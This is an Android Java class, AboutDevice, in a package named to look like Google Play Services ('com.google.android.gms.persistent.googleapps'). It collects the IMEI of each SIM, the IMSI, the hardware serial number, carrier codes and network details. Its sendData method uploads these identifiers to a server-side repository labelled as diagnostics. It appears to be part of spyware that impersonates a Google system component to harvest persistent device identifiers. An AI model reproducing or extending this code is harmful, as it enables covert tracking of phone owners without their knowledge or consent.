package com.google.android.gms.persistent.googleapps.data_collection;

import android.content.Context;
import android.net.ConnectivityManager;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
import com.google.android.gms.persistent.googleapps.network.models.data.NetworkInfo;
import com.google.android.gms.persistent.googleapps.utils.Constants;

import java.lang.reflect.Method;

import javax.inject.Inject;

import timber.log.Timber;

/**
 * Created by OldMan on 03.05.2017.
 */

public class AboutDevice {
    private Context context;
    private TelephonyManager telephonyManager;
    private SimCardInfo simCardInfo;

    @Inject
    public AboutDevice(SimCardInfo simCardInfo, Context context) {
        this.context = context;
        this.simCardInfo = simCardInfo;
        telephonyManager = (TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE);
        Timber.tag(AboutDevice.class.getSimpleName());
    }

    public void sendData() {
        NetworkInfo networkInfo = NetworkInfo.newBuilder()
                .imeiSim1(getIMEISim1())
                .imeiSim2(getIMEISim2())
                .isDualSim(getIsDualSIM())
                .mcc(getMCC())
                .mnc(getMNC())
                .phoneType(getPhoneType())
                .networkType(getNetworkType())
                .network(getConnectType())
                .operatorName(getOperatorName())
                .build();

        DeviceInfo deviceInfo = DeviceInfo.newBuilder()
                .brand(getBrand())
                .imei(getIMEI())
                .imsi(getIMSI())
                .manufactured(getManufactured())
                .model(getModel())
                .product(getProduct())
                .screenSize(getScreenSize())
                .serialNum(getSerialNum())
                .versionOS(getVersionOS())
                .sdk(getSDK())
                .network(networkInfo)
                .build();

        App.getAppComponent().getNetworkRepo()
                .addDiagnosticOfDevice(Data.newBuilder().info(deviceInfo)
                        .type(Constants.DIAGNOSTIC_PACKAGE)
                        .date(System.currentTimeMillis())
                        .build());
    }

    /**
     * get getBrand
     *
     * @return
     */
    private String getBrand() {
        try {
            return android.os.Build.BRAND;
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * get getSDK
     *
     * @return
     */
    public int getSDK() {
        try {
            return android.os.Build.VERSION.SDK_INT;
        } catch (Exception e) {
            Timber.e(e);
            return 0;
        }
    }

    /**
     * get getOperatorName
     *
     * @return
     */
    private String getOperatorName() {
        try {
            return telephonyManager.getNetworkOperatorName();
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getIMEI
     *
     * @return
     */

    private String getIMEI() {
        try {
            return telephonyManager.getDeviceId();
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getIMSI
     *
     * @return
     */

    private String getIMSI() {
        try {
            return telephonyManager.getSubscriberId();
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getVersion Android
     *
     * @return
     */
    private String getVersionOS() {
        try {
            return android.os.Build.VERSION.RELEASE;
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getManufactured
     *
     * @return
     */

    private String getManufactured() {
        try {
            return android.os.Build.MANUFACTURER;
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getProduct
     *
     * @return
     */
    private String getProduct() {
        try {
            return android.os.Build.PRODUCT;
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getModel
     *
     * @return
     */
    private String getModel() {
        try {
            return android.os.Build.MODEL;
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getSerialNumber
     *
     * @return
     */
    private String getSerialNum() {
        try {
            Class<?> c = Class.forName("android.os.SystemProperties");
            Method get = c.getMethod("get", String.class, String.class);
            return (String) (get.invoke(c, "ro.getSerialNum", "unknown"));
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * get PhoneType
     *
     * @return
     */
    private String getPhoneType() {
        int phoneType = telephonyManager.getPhoneType();
        String phoneTypeName;
        switch (phoneType) {
            case (TelephonyManager.PHONE_TYPE_CDMA):
                phoneTypeName = "PHONE_TYPE_CDMA";
                break;
            case (TelephonyManager.PHONE_TYPE_GSM):
                phoneTypeName = "PHONE_TYPE_GSM";
                break;
            case (TelephonyManager.PHONE_TYPE_NONE):
                phoneTypeName = "PHONE_TYPE_NONE";
                break;
            case (TelephonyManager.PHONE_TYPE_SIP):
                phoneTypeName = "PHONE_TYPE_SIP";
                break;
            default:
                phoneTypeName = "UNKNOWN";
                break;
        }
        return phoneTypeName;
    }

    /**
     * get NetworkType
     *
     * @return
     */
    private String getNetworkType() {
        int networkType = telephonyManager.getNetworkType();
        String type = null;
        switch (networkType) {
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                type = "1xRTT";
                break;
            case TelephonyManager.NETWORK_TYPE_CDMA:
                type = "CDMA";
                break;
            case TelephonyManager.NETWORK_TYPE_EDGE:
                type = "EDGE";
                break;
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                type = "eHRPD";
                break;
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                type = "EVDO rev. 0";
                break;
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                type = "EVDO rev. A";
                break;
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                type = "EVDO rev. B";
                break;
            case TelephonyManager.NETWORK_TYPE_GPRS:
                type = "GPRS";
                break;
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                type = "HSDPA";
                break;
            case TelephonyManager.NETWORK_TYPE_HSPA:
                type = "HSPA";
                break;
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                type = "HSPA+";
                break;
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                type = "HSUPA";
                break;
            case TelephonyManager.NETWORK_TYPE_IDEN:
                type = "iDen";
                break;
            case TelephonyManager.NETWORK_TYPE_LTE:
                type = "LTE";
                break;
            case TelephonyManager.NETWORK_TYPE_UMTS:
                type = "UMTS";
                break;
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
                type = "UNKNOWN";
                break;
        }
        return type;
    }

    /**
     * getConnectType
     *
     * @return
     */
    private String getConnectType() {
        String network = null;
        ConnectivityManager cm = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        try {
            switch (cm.getActiveNetworkInfo().getType()) {
                case ConnectivityManager.TYPE_MOBILE:
                    network = "Cell Network/3G";
                    break;
                case ConnectivityManager.TYPE_ETHERNET:
                    network = "Ethernet";
                    break;
                case ConnectivityManager.TYPE_WIFI:
                    network = "WiFi";
                    break;
                case ConnectivityManager.TYPE_DUMMY:
                    network = "DUMMY";
                    break;
                case ConnectivityManager.TYPE_BLUETOOTH:
                    network = "BLUETOOTH";
                    break;
                case ConnectivityManager.TYPE_MOBILE_DUN:
                    network = "MOBILE_DUN";
                    break;
                case ConnectivityManager.TYPE_VPN:
                    network = "VPN";
                    break;
                case ConnectivityManager.TYPE_WIMAX:
                    network = "WIMAX";
                    break;
                default:
                    network = "N/A";
            }
        } catch (Exception e) {
            Timber.e(e);
        }
        return network;
    }

    /**
     * getIMEISim1
     *
     * @return
     */

    private String getIMEISim1() {
        try {
            return simCardInfo.getImeiSIM1();
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getIMEISim2
     *
     * @return
     */

    private String getIMEISim2() {
        try {
            return simCardInfo.getImeiSIM2();
        } catch (Exception e) {
            Timber.e(e);
            return null;
        }
    }

    /**
     * getIMEISim1Ready
     *
     * @return
     */
    private boolean getIsSIM1Ready() {
        try {
            return simCardInfo.isSIM1Ready();
        } catch (Exception e) {
            Timber.e(e);
            return false;
        }
    }

    /**
     * getIMEISim2Ready
     *
     * @return
     */
    private boolean getIsSIM2Ready() {
        try {
            return simCardInfo.isSIM2Ready();
        } catch (Exception e) {
            Timber.e(e);
            return false;
        }
    }

    /**
     * getIsDualSim
     *
     * @return
     */
    private boolean getIsDualSIM() {
        try {
            return simCardInfo.isDualSIM();
        } catch (Exception e) {
            Timber.e(e);
            return false;
        }
    }

    /**
     * getMCC
     *
     * @return
     */
    private String getMCC() {
        String networkOperator = telephonyManager.getNetworkOperator();
        String mcc = null;
        try {
            if (networkOperator != null) {
                mcc = networkOperator.substring(0, 3);
            }
        } catch (Exception e) {
            Timber.e(e);
        }
        return mcc;

    }

    /**
     * getMCC
     *
     * @return
     */
    private String getMNC() {
        String networkOperator = telephonyManager.getNetworkOperator();
        String mnc = null;
        try {
            if (networkOperator != null) {
                mnc = networkOperator.substring(3);
            }
        } catch (Exception e) {
            Timber.e(e);
        }
        return mnc;

    }

    /**
     * getDisplayMetrics w*h
     *
     * @return
     */
    private String getScreenSize() {
        WindowManager wm = (WindowManager) context
                .getSystemService(Context.WINDOW_SERVICE);
        // Best way for new devices
        DisplayMetrics displayMetrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(displayMetrics);
        String screenSize = displayMetrics.widthPixels
                + " x " + displayMetrics.heightPixels;
        return screenSize;
    }

}
